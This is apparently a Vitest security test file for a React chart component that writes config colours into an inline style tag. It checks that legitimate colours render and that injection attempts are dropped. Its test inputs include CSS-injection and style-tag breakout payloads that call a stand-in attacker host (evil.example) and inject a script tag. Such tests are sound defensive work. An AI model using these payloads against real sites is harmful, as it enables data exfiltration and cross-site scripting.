import { describe, expect, it } from "vitest";
import { ChartContainer, type ChartConfig } from "@/components/ui/shadcn/chart";
import { renderWithProviders } from "@/test/render";
import { expectNoExecutableMarkup, resetXssFlag } from "@/test/domSecurity";

// The chart's <style> tag is the only dangerouslySetInnerHTML in the app.
// Its config is hardcoded at both call sites today, so these lock the sink
// down before anyone wires a colour up to api data
const renderChart = (config: ChartConfig) =>
    renderWithProviders(
        <ChartContainer config={config}>
            <svg />
        </ChartContainer>
    );

const styleText = (container: HTMLElement) =>
    Array.from(container.querySelectorAll("style"))
        .map((node) => node.textContent ?? "")
        .join("\n");

describe("the chart style tag", () => {
    it("emits the declaration for an ordinary hex colour", () => {
        const { container } = renderChart({
            records: { label: "Records", color: "#54a8e3" },
        });

        expect(styleText(container)).toContain("--color-records: #54a8e3;");
    });

    it.each([
        "hsl(var(--chart-1))",
        "rgb(84, 168, 227)",
        "rgba(84, 168, 227, 0.5)",
        "oklch(0.7 0.1 200)",
        "var(--accent)",
        "red",
    ])("keeps the legitimate colour %j working", (color) => {
        const { container } = renderChart({ records: { color } });

        expect(styleText(container)).toContain(`--color-records: ${color};`);
    });

    // Each of these closes the declaration and opens a rule of its own, which
    // would let a colour pull a url from inside a page that never loads one
    it.each([
        "red; } body { background: url(https://evil.example/leak) } .x {",
        "red;} * {background-image:url('https://evil.example/?c=')}",
        "}</style><script>window.__xss = 1</script><style>",
        "red;}@import url(https://evil.example/x.css);.a{",
        "url(https://evil.example/pixel.png)",
        "red\\3b } body {}",
    ])("drops the css breaking colour %j", (color) => {
        resetXssFlag();
        const { container } = renderChart({ records: { color } });
        const css = styleText(container);

        expect(css).not.toContain("evil.example");
        expect(css).not.toContain("</style>");
        expect(css).not.toContain("@import");
        expectNoExecutableMarkup(container);
    });

    it.each([
        "records}",
        "records: red; --x",
        "a</style><script>window.__xss=1</script>",
        "a{}",
        "a b",
        "1abc",
        "",
    ])("drops the invalid config key %j", (key) => {
        resetXssFlag();
        const { container } = renderChart({ [key]: { color: "#fff" } });
        const css = styleText(container);

        expect(css).not.toContain("</style>");
        expect(css).not.toContain("<script");
        expect(css).not.toContain(`--color-${key}`);
        expectNoExecutableMarkup(container);
    });

    it("writes no style tag at all when nothing has a colour", () => {
        const { container } = renderChart({ records: { label: "Records" } });

        expect(container.querySelectorAll("style")).toHaveLength(0);
    });

    it("keeps a rejected colour from taking the valid ones with it", () => {
        const { container } = renderChart({
            good: { color: "#54a8e3" },
            bad: {
                color: "red; } body { background: url(https://evil.example)",
            },
        });
        const css = styleText(container);

        expect(css).toContain("--color-good: #54a8e3;");
        expect(css).not.toContain("evil.example");
    });

    // The <style> content is written as raw html, so a css comment sequence
    // must not be able to swallow the rest of the sheet either
    it("does not let a colour comment out the remaining rules", () => {
        const { container } = renderChart({
            first: { color: "#fff /*" },
            second: { color: "#000" },
        });
        const css = styleText(container);

        expect(css).toContain("--color-second: #000;");
    });
});
